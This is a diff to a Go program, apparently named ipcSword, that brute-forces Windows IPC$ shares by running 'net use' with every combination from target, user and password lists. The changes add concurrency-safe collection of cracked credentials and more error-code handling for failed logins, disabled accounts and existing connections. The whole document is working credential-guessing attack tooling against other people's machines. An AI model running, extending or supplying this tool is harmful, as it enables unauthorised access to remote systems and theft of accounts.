@@ -14,19 +14,19 @@ import (
 
 var wg1 sync.WaitGroup
 
+//用来记录爆破成功的管道
+var logChannel = make(chan string, 100)
+
 func main() {
 
 	exPath, _ := os.Getwd()
 	fmt.Println(exPath)
 
-	//url_file := filepath.Join(exPath, "ipcSword", "urls.txt")
-	//user_file := filepath.Join(exPath, "ipcSword", "users.txt")
-	//password := filepath.Join(exPath, "ipcSword", "passwords.txt")
-
 	url_file := filepath.Join(exPath, "urls.txt")
 	user_file := filepath.Join(exPath, "users.txt")
 	password := filepath.Join(exPath, "passwords.txt")
 
+	//go logger()
 	//读取文件
 	fp, err := os.Open(url_file)
 	if err != nil {
@@ -71,7 +71,6 @@ func main() {
 					NetU(url, user, pwd)
 					wg1.Done()
 				}(url, user, pwd)
-				//NetUser(url, user, pwd)
 			}
 
 		}
@@ -79,10 +78,15 @@ func main() {
 	}
 
 	wg1.Wait()
-	//fmt.Println("===========所有爆破线程结束============")
-	//for successInfo := range okChain {
-	//	fmt.Println(successInfo)
-	//}
+	log.Println("===========所有爆破线程结束============")
+	close(logChannel)
+	select {
+	case res := <-logChannel:
+		fmt.Printf(res)
+	default:
+		fmt.Println("数据获取完毕")
+		return
+	}
 
 }
 
@@ -110,6 +114,7 @@ func ReadLine(fileName string) ([]string, error) {
 			return nil, err
 		}
 	}
+
 	return nil, err
 }
 
@@ -118,25 +123,32 @@ func NetU(url string, user string, password string) {
 	cmd := exec.Command("net", "use", "\\\\"+url+"\\ipc$",
 		password, "/user:"+user)
 
-	raw_payload := "net use \\\\" + url + "\\ipc$" + "\t" + user + "\t" + "/user:" + password
+	raw_payload := "net use \\\\" + url + "\\ipc$" + "\t" + password + "\t" + "/user:" + user
 	payload := fmt.Sprintf("[+] " + raw_payload)
-	fmt.Println(payload)
+	//log.Println(payload)
 
 	output, _ := cmd.CombinedOutput()
 
 	if strings.Contains(string(output), "1219") {
-		log.Println("[-] 目标" + url + " 已经存在连接")
-
+		//log.Println(string(output))
+		log.Println(payload + "  [-] 目标" + url + " 已经存在连接")
+		return
 	} else if strings.Contains(string(output), "success") {
-		log.Println("[!] 爆破成功!!!!!!! 远程地址:" + url + " 账户为:" + user + " 密码为:" + password)
+
+		log.Println(payload + "  [!] 爆破成功!!!!!!! 远程地址:" + url + " 账户为:" + user + " 密码为:" + password)
+		logChannel <- fmt.Sprintf("[!] 爆破成功!! 远程地址:%s  账户为:%s   密码为:%s", url, user, password)
+
 	} else if strings.Contains(string(output), "1326") {
-		log.Println("[-] 目标 " + url + "连接账号密码错误")
+		log.Println(payload + "  [-] 目标 " + url + "连接账号密码错误")
 
 	} else if strings.Contains(string(output), "53") {
-		log.Println("[-] 目标 %s网络路径未找到", url)
+		log.Println(payload+"  [-] 目标 %s网络路径未找到", url)
+
+	} else if strings.Contains(string(output), "1331") {
+		log.Println(payload+" [-] 目标 %s 此用户无法登录，因为该帐户当前已被禁用", url)
 
 	} else {
-		log.Println("[-] 目标 " + url + "爆破失败")
+		log.Println(payload + "  [-] 目标 " + url + "爆破失败")
 	}
 
 }
